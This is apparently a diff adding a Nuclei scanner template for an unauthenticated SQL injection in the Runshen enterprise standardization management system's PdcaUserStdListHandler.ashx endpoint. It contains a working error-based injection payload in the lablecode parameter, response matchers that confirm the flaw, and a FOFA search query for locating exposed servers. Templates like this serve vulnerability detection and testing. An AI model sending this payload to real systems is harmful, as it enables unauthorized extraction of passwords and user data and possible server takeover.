@@ -1,0 +1,32 @@
+http:
+    - matchers:
+        - condition: and
+          part: body
+          type: word
+          words:
+            - qppqq1qxkkq
+            - 转换成数据类型 int 时失败
+        - status:
+            - 500
+          type: status
+      matchers-condition: and
+      raw:
+        - |
+          POST /PDCA/ashx/PdcaUserStdListHandler.ashx?action=GetDataBy HTTP/1.1
+          Host: {{Hostname}}
+          User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:137.0) Gecko/20100101 Firefox/137.0
+          Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+
+          code=1&lablecode=-9458%29+OR+5511+IN+%28SELECT+%28CHAR%28113%29%2BCHAR%28112%29%2BCHAR%28112%29%2BCHAR%28113%29%2BCHAR%28113%29%2B%28SELECT+%28CASE+WHEN+%285511%3D5511%29+THEN+CHAR%2849%29+ELSE+CHAR%2848%29+END%29%29%2BCHAR%28113%29%2BCHAR%28120%29%2BCHAR%28107%29%2BCHAR%28107%29%2BCHAR%28113%29%29%29--+XeuQ&LableName=&page=1&rows=20
+id: runshen-PdcaUserStdListHandler_ashx-sql
+info:
+    author: Superhero
+    description: |-
+        fofa: body="PDCA/js/_publicCom.js"
+        润申信息企业标准化管理系统 PdcaUserStdListHandler.ashx 接口存在SQL注入漏洞，未经身份验证的远程攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。
+    name: 润申信息企业标准化管理系统 PdcaUserStdListHandler.ashx SQL注入漏洞
+    reference:
+        - https://mp.weixin.qq.com/s/4Cx8kvkENSf8pfxeF9UZ0Q
+    severity: high
+    tags:
+        - 润申信息企业标准化管理系统
